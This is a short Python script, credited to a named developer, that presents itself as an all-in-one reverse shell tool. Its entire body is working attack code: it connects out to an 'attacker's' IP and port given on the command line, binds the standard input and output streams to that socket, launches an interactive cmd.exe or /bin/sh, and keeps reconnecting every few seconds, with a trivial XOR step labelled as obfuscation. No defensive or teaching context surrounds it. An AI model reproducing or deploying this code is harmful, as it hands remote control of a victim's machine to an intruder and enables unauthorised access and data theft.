#!/usr/bin/env python

"""
 * ReverseShell
 * ReverseShell is an all-in-one reverse shell tool
 *
 * @Developed By karthithehacker <https://karthithehacker.com>
 */

"""

import socket
import subprocess
import os
import argparse
import time
import sys

# XOR Encryption (Basic Obfuscation)
def xor_encrypt_decrypt(data, key="karthi"):
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

# Reverse Shell Function
def reverse_shell(host, port, reconnect_delay=5):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print(f"[+] Connected to {host}:{port}")

            os.dup2(s.fileno(), 0)  # Redirect stdin
            os.dup2(s.fileno(), 1)  # Redirect stdout
            os.dup2(s.fileno(), 2)  # Redirect stderr

            # Send an encrypted message on connection
            s.send(xor_encrypt_decrypt(b"Connected!\n"))

            # Cross-platform shell selection
            shell = "cmd.exe" if os.name == "nt" else "/bin/sh"
            subprocess.call([shell, "-i"])

        except Exception as e:
            print(f"[-] Connection failed: {e}")
            print(f"[*] Reconnecting in {reconnect_delay} seconds...")
            time.sleep(reconnect_delay)

# Command-Line Arguments
parser = argparse.ArgumentParser(description="Reverse Shell Tool")
parser.add_argument("-host", "--host", required=True, help="Attacker's IP Address")
parser.add_argument("-port", "--port", type=int, required=True, help="Attacker's Port")
parser.add_argument("-r", "--reconnect", type=int, default=5, help="Reconnection delay (default: 5 sec)")
args = parser.parse_args()

reverse_shell(args.host, args.port, args.reconnect)
